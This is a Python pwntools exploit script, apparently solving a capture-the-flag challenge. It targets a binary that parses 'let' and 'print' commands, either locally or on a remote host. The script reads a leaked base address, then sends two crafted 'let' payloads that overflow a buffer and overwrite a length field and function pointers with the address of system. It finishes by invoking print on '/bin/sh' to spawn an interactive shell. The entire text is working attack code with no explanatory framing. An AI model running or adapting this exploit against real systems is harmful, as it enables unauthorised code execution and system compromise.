from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process("./main_ltbov0N")

e = ELF("./main_ltbov0N")

p.recvuntil(b"at: ")
dli_fbase = int(p.recvline().strip(), 16)
log.info(f"dli_fbase: {hex(dli_fbase)}")
e.address = dli_fbase
system = e.address + 0x12C0
error = e.address + 0x12A0
print(f"system: {hex(system)}")


def to_bytes(x):
    if isinstance(x, bytes):
        return x
    return str(x).encode()


def let(name, value):
    payload = b"let " + to_bytes(name) + b" = " + to_bytes(value) + b"\n"
    p.send(payload)


def print_logic(name):
    payload = b"print " + to_bytes(name) + b"\n"
    p.send(payload)


for i in range(5):
    let(f"a{i}", i)
    print(f"name : a{i}, value : {i}")

payload1 = bytearray(b"let " + b"B" * 68 + b"\n")
payload1[8:11] = b" = "
payload1[11:12] = b"0"
payload1[64:68] = p32(5)
print(f"payload1: {payload1}")
p.send(payload1)

payload2 = bytearray(b"let " + b"C" * 68 + b"\n")
payload2[8:11] = b" = "
payload2[11:12] = b"0"
payload2[44:48] = p32(6)
payload2[52:60] = p64(system)
payload2[60:68] = p64(system)
print(f"payload2: {payload2}")
p.send(payload2)

print_logic("/bin/sh")
p.interactive()
